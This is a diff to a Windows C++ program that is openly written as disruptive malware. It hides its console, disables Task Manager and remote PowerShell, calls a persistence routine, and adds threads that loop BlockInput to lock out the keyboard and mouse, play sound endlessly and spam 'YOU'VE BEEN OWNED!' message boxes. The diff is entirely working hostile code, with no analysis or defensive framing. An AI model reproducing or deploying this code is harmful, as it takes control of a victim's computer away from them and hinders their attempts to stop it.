@@ -41,7 +41,9 @@ void persistance(){
 
 //Disable user input until broken via CTR+ALT+DEL
 void BlockUserInput(){
-    BlockInput(true);
+    while(true){
+        BlockInput(true);
+    }
 }
 
 //Disable Task Manager if they use CTR+ALT+DEL to escape
@@ -63,6 +65,12 @@ void musicspam(){
     while(true){
         string sound = "PlaySound(TEXT(\"lul1.wav\"), NULL, SND_SYNC)";
         PlaySound(TEXT("lul1.wav"), NULL, SND_SYNC);
+    }
+}
+
+void boxspam(){
+    while(true){
+        MessageBoxA(NULL, "YOU'VE BEEN OWNED!", "Think Fast!", MB_ICONWARNING | MB_OK);
     }
 }
 
@@ -96,12 +104,17 @@ int main(){
     FreeConsole();  //Hide the console
     DisableTaskManager();
     disableRemotePowerShell();
-    //Blast annoying music on a looped thread
+    //Looped threads
     std::thread T1(musicspam);
+    std::thread T2(boxspam);
+    std::thread T3(BlockUserInput);
     //Loop full of obstructions
     while(true){
+        Sleep(1000);
+    }
+    /*
+    while(true){
         BlockUserInput();
-        MessageBoxA(NULL, "YOU'VE BEEN OWNED!", "Think Fast!", MB_ICONWARNING | MB_OK);
         STARTUPINFOA si = {sizeof(STARTUPINFO)};
         PROCESS_INFORMATION pi;
         CreateProcessA( "C:\\Windows\\System32\\cmd.exe",
@@ -110,6 +123,6 @@ int main(){
         browserTextSpam();
         Sleep(1000);
     }
-
+    */
     return 0;
 }
